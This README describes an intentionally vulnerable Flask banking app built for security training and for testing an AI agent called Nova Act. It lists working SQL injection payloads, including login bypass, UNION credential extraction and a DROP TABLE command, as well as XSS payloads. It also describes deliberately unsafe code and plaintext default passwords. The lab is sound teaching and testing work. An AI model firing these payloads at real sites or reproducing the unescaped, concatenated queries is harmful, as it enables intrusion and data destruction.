# Vulnerable Web Application for Security Testing

⚠️ **WARNING**: This application contains **intentional security vulnerabilities** for educational and testing purposes only. **DO NOT deploy to production or expose to the internet!**

## Overview

A realistic Python Flask banking web application (SecureBank) with intentional vulnerabilities:
- **SQL Injection** in authentication and search functionality
- **Cross-Site Scripting (XSS)** throughout the application
- **Two pages**: Login and Dashboard
- **SQLite database** with users and transactions

## Application Features

### 1. Login Page (/)
- Professional banking portal design
- Username/password authentication
- "Remember me" checkbox
- Links to password reset and account creation

### 2. Dashboard Page (/dashboard)
- User welcome banner with last login time
- Account balance cards (Checking, Savings, Credit Card)
- Transaction search functionality
- Recent transactions list
- Logout capability

## Vulnerabilities Included

### SQL Injection Vulnerabilities

#### 1. Login Authentication - BYPASS TO DASHBOARD
The login form concatenates user input directly into SQL queries, allowing authentication bypass.

**Working SQL Injection Payloads (Access Dashboard without password):**
```
✅ Bypass Method 1 - OR condition:
Username: ' OR '1'='1
Password: ' OR '1'='1
Result: Logs in as the first user (admin) and redirects to dashboard

✅ Bypass Method 2 - Comment out password check:
Username: admin' --
Password: (anything)
Result: Logs in as admin and redirects to dashboard

✅ Bypass Method 3 - UNION attack:
Username: ' UNION SELECT 1,'admin','password','admin@test.com','admin'--
Password: (anything)
Result: Creates fake admin user and redirects to dashboard

✅ Bypass Method 4 - Simple OR:
Username: admin' OR '1'='1' --
Password: (anything)
Result: Logs in as admin and redirects to dashboard
```

**How it works:**
- Original query: `SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'`
- With `' OR '1'='1`: `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'`
- This returns the first user in database (admin) → Session created → Redirected to /dashboard

#### 2. Transaction Search
The search functionality is vulnerable to SQL injection.

**Test Payloads (after logging in):**
```
Search: ' OR '1'='1
Search: '; DROP TABLE users--
Search: ' UNION SELECT username, password FROM users--
```

### Cross-Site Scripting (XSS) Vulnerabilities

#### 1. Login Page - Error Message XSS ⚠️ MAIN XSS POINT
When login fails, the username is reflected in the error message WITHOUT escaping.

**How XSS Works:**
1. Enter XSS payload as username
2. Enter wrong password (or leave empty)
3. Submit the form
4. Error message displays: "Login failed! The username '**[YOUR_PAYLOAD]**' does not exist..."
5. 🔥 **XSS payload executes in the error message!**

**Working XSS Payloads:**
```
✅ Alert Box:
Username: <script>alert('XSS')</script>
Password: wrongpassword
Result: Alert box appears with "XSS"

✅ Image Error:
Username: <img src=x onerror=alert('XSS')>
Password: anything
Result: Alert box appears when image fails to load

✅ SVG XSS:
Username: <svg onload=alert('XSS')>
Password: anything
Result: Alert box appears when SVG loads

✅ Cookie Stealing:
Username: <script>alert(document.cookie)</script>
Password: anything
Result: Shows session cookie in alert

✅ HTML Injection:
Username: <h1 style="color:red">HACKED!</h1>
Password: anything
Result: Large red "HACKED!" text appears in error message

✅ Event Handler:
Username: <body onload=alert('XSS')>
Password: anything
Result: Alert when body loads
```

#### 2. Dashboard - Welcome Message
Username displayed in welcome banner without escaping.

**Test:** Login with XSS payload as username using SQL injection:
```
Username: <script>alert('Dashboard XSS')</script>' OR '1'='1' --
Password: anything
Result: XSS executes on dashboard page
```

#### 3. Dashboard - Search Results
Search queries are reflected without sanitization.

**Test Payloads (in search box after login):**
```
<script>alert('XSS in search')</script>
<img src=x onerror=alert('Dashboard XSS')>
<body onload=alert('XSS')>
```

## Running the Application

### Option 1: Docker (Recommended)

Build and run with Docker:
```bash
cd vunerable_website
docker build -t vulnerable-webapp .
docker run -p 5000:5000 vulnerable-webapp
```

Access at: http://localhost:5000

### Option 2: Local Python

Install dependencies:
```bash
cd vunerable_website
pip install -r requirements.txt
```

Run the application:
```bash
python app.py
```

Access at: http://localhost:5000

## Default Credentials

The application includes test users:
- **Username:** `admin` / **Password:** `password123` (admin role)
- **Username:** `john` / **Password:** `john2024` (user role)
- **Username:** `sarah` / **Password:** `sarah123` (user role)
- **Username:** `mike` / **Password:** `mike456` (user role)

## Database Structure

### Users Table
- `id`: Primary key
- `username`: Unique username
- `password`: Plain text password (vulnerability!)
- `email`: User email
- `role`: User role (admin/user)

### Transactions Table
- `id`: Primary key
- `user_id`: Foreign key to users
- `description`: Transaction description
- `amount`: Transaction amount (negative for expenses, positive for income)
- `transaction_date`: Timestamp

## Testing with Nova Act

Use this vulnerable application as a target for the Nova Act security testing agent:

### Test SQL Injection
```python
from nova_act import NovaAct

with NovaAct(starting_page="http://localhost:5000", ignore_https_errors=True) as nova:
    # Test SQL Injection bypass
    nova.act("Enter ' OR '1'='1 in the username field and ' OR '1'='1 in password, then click Sign In")
    
    # Verify dashboard access
    nova.act("Check if we reached the dashboard page")
```

### Test XSS
```python
with NovaAct(starting_page="http://localhost:5000", ignore_https_errors=True) as nova:
    # Test XSS in login
    nova.act("Enter <script>alert('XSS')</script> in the username field and test123 in password")
    
    # Login properly and test search XSS
    nova.act("Enter admin in username and password123 in password, then click Sign In")
    nova.act("In the search box, enter <img src=x onerror=alert('XSS')> and click Search")
```

## Stopping the Application

- **Docker:** `docker stop <container_id>`
- **Local:** Press `Ctrl+C` in the terminal

## Security Notes

This application demonstrates **what NOT to do** in real applications:

❌ **Never** concatenate user input directly into SQL queries  
✅ **Always** use parameterized queries or ORMs

❌ **Never** render user input without escaping  
✅ **Always** sanitize and escape user-provided data

❌ **Never** expose detailed error messages to users  
✅ **Always** log errors server-side and show generic messages

## Educational Purpose Only

This application is designed for:
- Learning about web vulnerabilities
- Testing security scanning tools
- Training security professionals
- Demonstrating attack techniques in a safe environment

**Do not use this code in production applications!**
